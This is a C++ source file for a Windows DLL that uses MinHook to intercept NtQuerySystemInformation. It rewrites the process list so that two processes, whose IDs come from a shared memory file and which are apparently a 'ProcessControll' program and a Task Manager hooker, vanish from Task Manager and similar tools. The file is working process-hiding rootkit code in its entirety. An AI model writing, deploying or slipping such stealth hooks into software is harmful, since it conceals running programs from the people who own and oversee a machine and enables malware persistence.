#undef UNICODE

// ------------------ INCLUDES ------------------------
#include "../headers/definitions.h"
#include "MinHook.h"
#include "../../commonUtils/headers/Logger.h"
#include "../../commonUtils/headers/memmapfile.h"
#include "../../commonUtils/headers/constants.h"


// ------------------ LIBRARIES -----------------------

#if defined _M_X64
#pragma comment(lib, "libMinHook.x64.lib")
#elif defined _M_IX86
#pragma comment(lib, "libMinHook.x86.lib")
#endif

// ----------------------------------- GLOBALS -----------------------------------------------
FARPROC g_fpQuerySysInfo;
DWORD g_processContollPID;
DWORD g_taskmgrHookerPID;

//------------------------------------- NtQuerySystemInformation HOOK ------------------------------------------
typedef NTSTATUS(WINAPI *NTQSYSINFO)(_In_ SYSTEM_INFORMATION_CLASS, _Inout_ PVOID, _In_ ULONG, _Out_opt_ PULONG);

// Pointer to trampoline function, it will be used to call real (not detoured) function
NTQSYSINFO realNtQuerySystemInfo = NULL;

__declspec(dllexport) NTSTATUS WINAPI MyNtQuerySystemInformation(_In_       SYSTEM_INFORMATION_CLASS SystemInformationClass,
                                                                 _Inout_    PVOID SystemInformation,
                                                                 _In_       ULONG SystemInformationLength,
                                                                 _Out_opt_  PULONG ReturnLength)
{
    NTSTATUS res = realNtQuerySystemInfo(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (!NT_SUCCESS(res) || SystemInformationClass != SystemProcessInformation)
        return res;
    

    // trying to skip processes with g_processContollPID and g_taskmgrHookerPID ids
    PSYSTEM_PROCESS_INFO curInfo = (PSYSTEM_PROCESS_INFO)SystemInformation;
    PSYSTEM_PROCESS_INFO prevInfo = NULL;
    PSYSTEM_PROCESS_INFO nextInfo = NULL;
    while (curInfo) {
        if (!curInfo->NextEntryOffset) {
            nextInfo = NULL;
        }
        else {
            nextInfo = (PSYSTEM_PROCESS_INFO)(((LPBYTE)curInfo) + curInfo->NextEntryOffset);
        }
        // if process is our target process to skip in process list, we 
        // rewrite "next" pointer in previous process so it's points to next after current
        if ((DWORD)curInfo->ProcessId == g_processContollPID ||
            (DWORD)curInfo->ProcessId == g_taskmgrHookerPID) {
            if (prevInfo != NULL) {
                prevInfo->NextEntryOffset += curInfo->NextEntryOffset;
                if (!curInfo->NextEntryOffset)
                    prevInfo->NextEntryOffset = 0;
            }
            else {
                // can happen only once
                SystemInformation = nextInfo;
            }
        }
        else {
            // if we want to skip current process (curInfo) we 
            // do need to retain prevInfo pointer
            prevInfo = curInfo;
        }
        curInfo = nextInfo;
    }


    return res;
}


static void readPIDSFromSharedFile(Logger &logger) {
    logger.info("Trying to read from shared mem");

    my_shared_mem::MemMappedFile file;

    if (!file.openExisting(taskmgt_hook_consts::SHARED_FILE_WITH_PIDS, 
        (common_consts::UL_MAX_DIGIT_NUMBER + 1) * 2, 
        FILE_MAP_READ)) {
        logger.error("Cannot open shared file with pids! err code: %i", GetLastError());
    }

    file.readDecimal(&g_processContollPID);
    file.readDecimal(&g_taskmgrHookerPID);

    logger.info("ProcessControll.exe pid = %lu ; tasmgrHooker pid = %lu",
                   g_processContollPID, g_taskmgrHookerPID);
}

int getLoggingFilename(char *buffer, int bufSize) {
    my_shared_mem::MemMappedFile file;
    if (!file.openExisting(common_consts::SHARED_FILE_WITH_LOG_PATH,
        common_consts::MAX_PATH_LENGTH, FILE_MAP_READ)) {

        return 1;
    }

    if (buffer == NULL || !file.readLine(buffer))
        return 1;

    strcat_s(buffer, bufSize, taskmgt_hook_consts::LOG_FILE_SUFFIX);

    DWORD pid = GetCurrentProcessId();
    char strPid[common_consts::UL_MAX_DIGIT_NUMBER];
    _ultoa_s(pid, strPid, common_consts::DECIMAL_NOTATION);
    strcat_s(buffer, bufSize, strPid);
    strcat_s(buffer, bufSize, ".txt");
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved)
{
    if (dwReason == DLL_PROCESS_ATTACH) {
        char logFilename[common_consts::MAX_PATH_LENGTH];
        getLoggingFilename(logFilename, common_consts::MAX_PATH_LENGTH);
        Logger logger(logFilename, true, true, common_consts::IS_DLL_LOGGERS_MUTED);
        readPIDSFromSharedFile(logger);

        g_fpQuerySysInfo = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");

        logger.info("Dll process attach. Initializing hook ...");

        // Creating a HOOK
        if (MH_Initialize() != MH_OK) {
            logger.error("Cannot initialize minhook!");
            return 1;
        }
        if (MH_CreateHook(g_fpQuerySysInfo,
            &MyNtQuerySystemInformation,
            reinterpret_cast<void**>(&realNtQuerySystemInfo)) != MH_OK) {
            logger.error("Cannot create hook!");
            return 1;
        }
        if (MH_EnableHook(g_fpQuerySysInfo) != MH_OK) {
            logger.error("Cannot enable hook!");
            return 1;
        }

    }
    else if (dwReason == DLL_PROCESS_DETACH) {
        char logFilename[common_consts::MAX_PATH_LENGTH];
        getLoggingFilename(logFilename, common_consts::MAX_PATH_LENGTH);
        Logger logger(logFilename, false, true, common_consts::IS_DLL_LOGGERS_MUTED);

        logger.info("Dll detach.");

        if (MH_DisableHook(g_fpQuerySysInfo) != MH_OK) {
            logger.error("Cannot disable hook!");
            return 1;
        }

        if (MH_Uninitialize() != MH_OK) {
            logger.error("Cannot uninit minhook!");
            return 1;
        }
    }
    return TRUE;
}